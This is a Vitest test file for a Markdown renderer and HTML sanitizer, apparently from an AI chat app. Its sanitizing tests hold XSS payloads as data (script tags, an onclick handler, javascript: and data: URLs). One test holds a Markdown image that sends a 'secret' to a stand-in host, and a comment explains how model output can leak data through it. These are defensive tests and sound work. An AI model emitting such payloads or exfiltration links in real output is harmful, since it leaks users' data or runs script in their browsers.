import { describe, expect, it } from 'vitest';
import { highlightCode, languageOf, markMatches, renderMarkdown, sanitize } from './markdown';

/** Renders into a detached element, the way the Markdown component does. */
function render(source: string): HTMLElement {
  const host = document.createElement('div');
  host.innerHTML = renderMarkdown(source);
  return host;
}

describe('markdown rendering', () => {
  it('renders a table as a table', () => {
    const host = render('| a | b |\n| --- | --- |\n| 1 | 2 |');
    expect(host.querySelectorAll('table')).toHaveLength(1);
    expect(host.querySelectorAll('th')).toHaveLength(2);
    expect(host.querySelectorAll('td')).toHaveLength(2);
  });

  it('renders a fenced block with syntax highlighting', () => {
    const host = render('```ts\nconst x: number = 1;\n```');
    const code = host.querySelector('pre > code');
    expect(code).toBeTruthy();
    expect(code!.querySelectorAll('.hljs-keyword').length).toBeGreaterThan(0);
    expect(code!.textContent).toContain('const x: number = 1;');
  });

  it('renders lists, blockquotes and collapsible sections', () => {
    const host = render(
      '- one\n- two\n\n> quoted\n\n<details><summary>more</summary>\n\nhidden\n\n</details>',
    );
    expect(host.querySelectorAll('li')).toHaveLength(2);
    expect(host.querySelector('blockquote')?.textContent).toContain('quoted');
    expect(host.querySelector('details > summary')?.textContent).toBe('more');
  });

  it('leaves an unknown fence language as escaped plain text', () => {
    const host = render('```wat\n<b>not bold</b>\n```');
    expect(host.querySelector('b')).toBeNull();
    expect(host.querySelector('code')?.textContent).toContain('<b>not bold</b>');
  });
});

describe('sanitizing', () => {
  it('drops scripts, keeping their text visible rather than executing it', () => {
    const host = render('before <script>steal()</script> after');
    expect(host.querySelector('script')).toBeNull();
    expect(host.innerHTML).not.toContain('<script');
  });

  it('drops event handlers from tags it does allow', () => {
    const html = sanitize('<p onclick="steal()">text</p>');
    expect(html).toContain('text');
    expect(html).not.toContain('onclick');
  });

  it('refuses javascript: and data: URLs', () => {
    const html = sanitize(
      '<a href="javascript:steal()">a</a><a href="data:text/html,<b>x</b>">b</a>',
    );
    expect(html).not.toContain('javascript:');
    expect(html).not.toContain('data:text/html');
  });

  it('never renders an image tag, so model output cannot fire a request', () => {
    // `![](url)` is a network call the model chose, with the URL as its
    // channel — it would fire on paint, with nothing to click.
    const host = render('![leak](https://elsewhere.example/?d=secret)');
    expect(host.querySelector('img')).toBeNull();
    expect(host.innerHTML).not.toContain('elsewhere.example');
  });

  it('opens links safely, without a handle back to the app', () => {
    const html = sanitize('<a href="https://example.com">link</a>');
    expect(html).toContain('target="_blank"');
    expect(html).toContain('rel="noopener noreferrer nofollow"');
  });

  it('strips style attributes and tags', () => {
    const html = sanitize('<style>body{display:none}</style><p style="color:red">x</p>');
    expect(html).not.toContain('<style');
    expect(html).not.toContain('style=');
  });

  it('sanitizes what the highlighter itself produces', () => {
    const html = highlightCode('</code></pre><script>steal()</script>', 'ts');
    expect(html).not.toContain('<script');
  });
});

describe('languageOf', () => {
  it('resolves aliases the model actually writes', () => {
    expect(languageOf('ts')).toBe('typescript');
    expect(languageOf('sh')).toBe('bash');
    expect(languageOf('yml')).toBe('yaml');
    expect(languageOf('patch')).toBe('diff');
  });

  it('is null for a language we do not have, rather than a guess', () => {
    expect(languageOf('brainfuck')).toBeNull();
    expect(languageOf(undefined)).toBeNull();
    expect(languageOf('')).toBeNull();
  });

  it('ignores the extra info some fences carry', () => {
    expect(languageOf('ts title=example.ts')).toBe('typescript');
  });
});

describe('markMatches', () => {
  it('wraps every occurrence, case-insensitively, in text nodes only', () => {
    const host = render('The token budget is a token thing');
    const count = markMatches(host, 'token');

    expect(count).toBe(2);
    expect(host.querySelectorAll('mark')).toHaveLength(2);
    // Highlighting changes structure, never text.
    expect(host.textContent?.trim()).toBe('The token budget is a token thing');
  });

  it('cannot introduce markup from the query', () => {
    // Inline code keeps the angle brackets as text, which is what a query
    // containing markup has to match against.
    const host = render('a `<b>` literal query');
    markMatches(host, '<b>');

    expect(host.querySelectorAll('b')).toHaveLength(0);
    expect(host.querySelector('mark')?.textContent).toBe('<b>');
  });

  it('does nothing for an empty query', () => {
    const host = render('anything');
    expect(markMatches(host, '')).toBe(0);
    expect(host.querySelectorAll('mark')).toHaveLength(0);
  });
});
